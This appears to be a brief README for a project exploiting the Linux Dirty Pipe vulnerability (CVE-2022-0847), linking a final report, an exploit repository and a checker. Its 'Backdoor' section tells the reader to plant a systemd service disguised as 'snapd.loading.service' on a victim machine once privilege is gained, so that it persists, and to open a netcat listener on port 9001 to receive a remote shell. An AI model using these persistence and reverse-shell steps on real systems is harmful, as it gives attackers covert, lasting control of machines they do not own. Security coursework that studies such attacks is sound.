# Detailed information this project can be found in our final project report (Dirty Pipe Cola - Final report.pdf)
https://github.com/stefanoleggio/dirty-pipe-cola/blob/main/Dirty%20Pipe%20Cola%20-%20Final%20report.pdf 

# Reference to CVE-2022-0847-DirtyPipe-Exploits
- https://github.com/febinrev/dirtypipez-exploit
- https://github.com/basharkey/CVE-2022-0847-dirty-pipe-checker

# Backdoor
- On the victim's machine, once priviledge has been achieved, place the snapd.loading.service in /etc/systemd/system folder. And run `$ sudo systemctl enable snapd.loading.service --now`. Note that the IP of the attacker device/server needs to be changed.

- On attacker machine, execute whenever you want to connect: `$ nc -nvlp 9001`


